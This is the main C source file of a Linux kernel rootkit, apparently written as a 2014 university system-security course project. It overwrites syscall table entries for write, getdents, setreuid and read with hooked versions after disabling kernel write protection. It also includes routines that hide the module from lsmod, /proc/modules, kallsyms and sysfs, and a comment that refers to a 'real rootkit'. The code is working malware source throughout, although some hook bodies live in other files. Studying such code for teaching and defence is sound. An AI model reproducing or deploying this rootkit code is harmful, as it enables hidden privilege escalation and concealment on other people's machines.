/**********************************************************
	Last Updated: Nov 16, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description
		main function 
		device registration
		syscall table hijacking
***********************************************************/

#include"../headers/all.h"

/* 
	Get system call table address from System.map
		$ sudo cat /boot/System.map-`uname -r` | grep sys_call_table
		ffffffff81801300 R sys_call_table
	The following command will not work in kernel 3.x
		$ sudo cat /proc/kallsyms | grep sys_call_table
		0000000000000000 R sys_call_table
*/

//void **sys_call_table = (void *)0xffffffff81801300;
static unsigned long *sys_call_table = (unsigned long *) 0xffffffff81801300;

// Get the addresses of the original system calls
asmlinkage long (*original_write)(unsigned int, const char*, size_t);
asmlinkage long (*original_getdents)(unsigned int, struct linux_dirent64*, unsigned int);
asmlinkage long (*original_setreuid)(uid_t, uid_t);
asmlinkage long (*original_open)(const char*, int, int);
asmlinkage long (*original_read)(unsigned int, char*, size_t);

// Extern symbols here:
extern char rk_buf[BUFLEN];
extern int is_open;
extern struct miscdevice kcr;
extern asmlinkage long my_getdents(unsigned int, struct linux_dirent64*, unsigned int);
extern asmlinkage long my_setreuid(uid_t, uid_t);
extern asmlinkage long my_read(unsigned int, char*, size_t);
extern bool init_HJ_proc();
extern bool rm_HJ_proc();

static struct list_head *saved_mod_list_head;
struct kobject *saved_kobj_parent;
struct file* hide_contents(char* file, char* target, char* hidden);


/*By Chen
 *
 * in buf special types: 4B + 8B_prifix+ strlen(TARGET)+4B_surfix + 2B(white space) 
 *
 *
 *
 * */
asmlinkage int 
my_write(unsigned int fd, const char *buf, size_t nbyte){	
	//char *index1, *index2;
	//char *hide_str = "test";
	//bool is_special = 1;
//	char *str2 = "flush.sh";
	if(fd == 1){
		
//		if(index1 = strstr(buf, hide_str)){
//			return -1;
//			index2 = strstr(buf, str2);
/*
			int offset = is_special?strlen(hide_str) +4+2:strlen(hide_str)+2;
			printk("target len %d, test ahead : %s\n ", strlen(hide_str),  index1-8);
			if(is_special)
				memcpy(index1-8, index1+offset, strlen(index1+offset));
			else
				memcpy(index1, index1+offset, strlen(index1+offset));
				*/
//		}
	}	
	return (*original_write)(fd, buf, nbyte);
}




/* Koo: 
 *
 * Hiding/Unhiding the module itself
 *		<linux/export.h>
 *			struct module __this_module
 *			#define THIS_MODULE (&__this_module)
 *		<linux/kobject.h>
 *			void kobject_del(struct kobject *kobj);
 *			int kobject_add(struct kobject *kobj, struct kobject *parent, const char fmt, ...);
 *		<linux/list.h>
 *			void list_del(struct list_head *entry)
 *			void list_add(struct list_head *new, struct list_head *head)
 * Testing to find the module in kernel
 *	a. lsmod | grep kcr
 *	b. modprobe
 *	c. cat /proc/modules | grep kcr
 *	d. cat /proc/kallsyms | grep "\[kcr\]"
 *	e. ls -la /sys/module | grep kcr
 * */
void
hiding_module(void) {
	// Save the addr of this module to restore if necessary
	saved_mod_list_head = THIS_MODULE->list.prev;
	saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
	
	// Remove this module from the module list and kobject list
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	
	// Remove the symbol and string tables for kallsyms
	// IF NOT SET TO NULL, IT WILL GET THE FOLLOWING ERROR MSG:
	// "sysfs group ffff8800260e4000 not found for kobject 'rt'"
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
	
	if (DEBUG == 1) 
		printk(KERN_ALERT "Module successully hidden!\n");
}

void
unhiding_module(void) {
	int r;
	
	// Restore this module to the module list and kobject list
	list_add(&THIS_MODULE->list, saved_mod_list_head);
	if ((r = kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj_parent, "rt")) < 0)
		printk(KERN_ALERT "Error to restore kobject to the list back!!\n");
	
	if (DEBUG == 1) 
		printk(KERN_ALERT "Module successully revealed!\n");
}





// Entry function for kernel module initialization
static int 
__init init_mod(void){
	
	misc_register(&kcr);
	
	if (DEBUG == 1) {
		printk(KERN_ALERT "Entering hooking module!\n");
		printk(KERN_INFO "This process is \"%s\" (pid %i)\n", current->comm, current->pid);
	}
	
	// Set system call table to be writable by changing cr0 register
	PROT_DISABLE;
	
	// Get original system call addr in asm/unistd.h
	original_write = (void *)sys_call_table[__NR_write];			// __NR_write 64
	original_getdents = (void *)sys_call_table[__NR_getdents];		// __NR_getdents64 61
	original_setreuid = (void *)sys_call_table[__NR_setreuid];		// __NR_setreuid 145
	original_read = (void *)sys_call_table[__NR_read];				// __NR_open 63
	
	// Overwrite manipulated system calls
	sys_call_table[__NR_write] = (unsigned long) my_write;
	sys_call_table[__NR_getdents] = (unsigned long) my_getdents;
	sys_call_table[__NR_setreuid] = (unsigned long) my_setreuid;
	sys_call_table[__NR_read] = (unsigned long) my_read;
	
	if(init_HJ_proc() == false)
		rm_HJ_proc();

	//Changing the control bit back
	PROT_ENABLE;
	
	if (DEBUG == 1) {
		printk(KERN_INFO "Original/Hooked syscall for write(): 0x%p / 0x%p\n", 
			(void*)original_write, (void*)my_write);
		printk(KERN_INFO "Original/Hooked syscall for getdents(): 0x%p / 0x%p\n", 
			(void*)original_getdents, (void*)my_getdents);
		printk(KERN_INFO "Original/Hooked syscall for setreuid(): 0x%p / 0x%p\n", 
			(void*)original_setreuid, (void*)my_setreuid);
		printk(KERN_INFO "Original/Hooked syscall for read(): 0x%p / 0x%p\n", 
			(void*)original_read, (void*)my_read);
	}
	
	/*
	// This feature seems unstable now!
	// The first insmod is fine, but when rmmod and insmod again.. :(
	hiding_module();
	unhiding_module();
	*/
	
	return 0;
}

static void 
__exit exit_mod(void){

	 misc_deregister(&kcr);
	 
	// Restore all system calls to the original ones
	PROT_DISABLE;
	sys_call_table[__NR_write] = (unsigned long) original_write;
	sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
	sys_call_table[__NR_setreuid] = (unsigned long) original_setreuid;
	sys_call_table[__NR_read] = (unsigned long) original_read;

	if(rm_HJ_proc() == false)
		panic("oops HJ_proc\n");

	PROT_ENABLE;
	
	if (DEBUG == 1) 
		printk(KERN_ALERT "Exiting hooking module!\n");
		
}

module_init(init_mod);
module_exit(exit_mod);

/* 
	GENERAL INFORMATION ABOUT THE KERNEL MODULE
	THIS PART SHOULD BE REMOVED IN REAL ROOTKIT! :)
*/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("hykoo & yaohchen");
MODULE_DESCRIPTION("CSE509-PJT");
MODULE_VERSION("0.1");
MODULE_SUPPORTED_DEVICE("Tested with kernel 3.2.0-29-generic in Ubuntu");
